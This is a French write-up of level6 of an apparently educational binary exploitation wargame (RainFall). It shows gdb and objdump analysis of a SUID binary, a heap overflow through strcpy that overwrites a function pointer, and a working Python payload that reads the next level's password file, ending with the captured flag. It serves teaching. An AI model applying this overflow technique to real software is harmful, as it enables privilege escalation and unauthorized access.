Connextion au level6 -> Bit NX desactive
Chech du home et des permissions du binaire -> Bit SUID level7
Exection du binaire sans argument -> SegV
Exection du binaire avec -> "Nope"

Reecriture du code source en utilisant objdump -d et gdb avec peda

on voit qu'une fonction 'n' appelle la commande "system("/bin/cat /home/user/level7/.pass")"

on se doute qu'il va falloir ecraser le contenu d'une adresse par celle de cette fonction.

nous voyons dans le main qu'il y a 2 appel a malloc, le deuxieme est une allocation de pointeur de fonction qui est set plus tard vers la fonction m

la premiere alloction est passe en argument en tant que buffer de destination du strcpy, et argv[1] en tant que source

gdb-peda$ print $eax
$10 = 0x804a008

0x804a008 etant l'adresse de destination du strcpy et le premier malloc, nous pouvons voir sa taille et le contenu des prochaines adresses de cette maniere

gdb-peda$ x/30x 0x804a008
0x804a008:	0x41414141	0x00000000	0x00000000	0x00000000
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000011	0x08048468	0x00000000
0x804a058:	0x00000000	0x00020fa9	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000

$objdump -t ./level6 | grep m
08048468 g     F .text	00000014              m

On retrouve 0x08048468, l'adresse de la fonction m. Cette adresse se trouve a l'adresse pointer par le pointeur allouer apres celle du buffer

Sachant qu'aucun test de longueur sur le buffer n'est effectue, nous pouvons alors ecraser cette adresse par celle de la fonction n

$objdump -t ./level6 | grep n
08048454 g     F .text	00000014              n

Il y a donc 72 octets prevu pour le buffer donc le payload doit etre

72 caracteres + adresses de n

level6@RainFall:~$ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
